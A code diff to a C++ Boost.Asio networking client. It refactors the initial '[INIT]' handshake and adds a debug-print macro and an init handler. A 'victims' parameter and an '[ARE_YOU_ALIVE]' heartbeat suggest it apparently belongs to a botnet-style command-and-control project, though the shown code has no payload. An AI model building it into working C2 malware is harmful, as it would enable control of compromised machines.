@@ -1,5 +1,11 @@
 #include "client.h"
 
+#ifdef NDEBUG
+#define PRINT(a, b)
+#else
+#define PRINT(a, b) std::cout << "[DEBUG]: " << (a) << (b) << std::endl;
+#endif
+
 client::client(io::io_context& io_context, std::uint16_t port, std::string server_ip, std::uint16_t server_port, victims* victims)
     : io_context_(io_context),
       acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
@@ -9,6 +15,9 @@ client::client(io::io_context& io_context, std::uint16_t port, std::string serve
 	command_handlers_ = {
 	    {"[ARE_YOU_ALIVE]",
 	     boost::bind(&client::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
+	    {"[INIT]",
+	     boost::bind(&client::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
+
 	};
 }
 
@@ -24,12 +33,15 @@ void client::start() {
 	auto server = server_session_container_.emplace_back(std::make_shared<session>(std::move(*socket_), io_context_, 1));
 
 	server->start(boost::bind(&client::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
-	server->send("INIT;flk23f9f_f=fsd\n");
+
+	std::vector<std::string> output_params;
+	std::string command = "[INIT]";
+	server->send(msg_parser_.genCommand(command, output_params));
 	server->read();
 }
 
-void client::handleResponse(std::string& query, session* client) {
-	std::cout << client->endpoint_ << " Incoming query: " << query << std::endl;
+void client::handleResponse(std::string& query, session* server) {
+	PRINT(server->endpoint_, (": " + query));
 
 	auto parsed_msg = msg_parser_.parse_msg(query);
 
@@ -37,10 +49,14 @@ void client::handleResponse(std::string& query, session* client) {
 		return;
 	}
 	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
-	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], client);
+	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], server);
 }
 
 void client::handleAlive(std::string& command, std::vector<std::string>& params, session* client) {
 	std::vector<std::string> output_params = {"1"};
 	client->send(msg_parser_.genCommand(command, output_params));
+}
+
+void client::handleInit(std::string& command, std::vector<std::string>& params, session* client) {
+	PRINT("Connected succesfully", "");
 }
